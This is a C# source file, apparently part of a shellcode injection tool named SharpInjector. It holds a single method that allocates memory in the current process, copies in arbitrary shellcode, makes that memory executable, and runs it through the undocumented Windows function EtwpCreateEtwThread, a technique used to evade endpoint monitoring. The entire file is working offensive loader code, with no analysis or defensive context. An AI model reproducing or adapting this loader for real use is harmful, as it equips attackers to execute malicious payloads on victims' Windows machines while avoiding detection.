using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace SharpInjector
{
    class EtwpCreateEtwThread
    {


        public static void ExecuteEtwpCreateEtwThread(byte[] Shellcode)
        {

            Console.WriteLine("[*] Allocating shellcode in current process...");
            IntPtr Address = WinAPI.VirtualAlloc(IntPtr.Zero, Shellcode.Length, WinAPI.MEM_COMMIT | WinAPI.MEM_RESERVE, WinAPI.PAGE_READWRITE);
            if (Address == IntPtr.Zero)
            {
                return;
            }

            IntPtr ShellCode_Pointer = Marshal.AllocHGlobal(Shellcode.Length);
            Marshal.Copy(Shellcode, 0, ShellCode_Pointer, Shellcode.Length);
            WinAPI.RtlCopyMemory(Address, ShellCode_Pointer, Shellcode.Length);

            WinAPI.VirtualProtect(Address, Shellcode.Length, WinAPI.PAGE_EXECUTE_READ, out uint OldProtect);

            Console.WriteLine("[*] Calling EtwpCreateEtwThread...");
            IntPtr location = WinAPI.EtwpCreateEtwThread(Address, IntPtr.Zero);
            WinAPI.WaitForSingleObject(location, 0xFFFFFFFF);
            Console.WriteLine("[*] Shellcode executed");

        }


    }
}
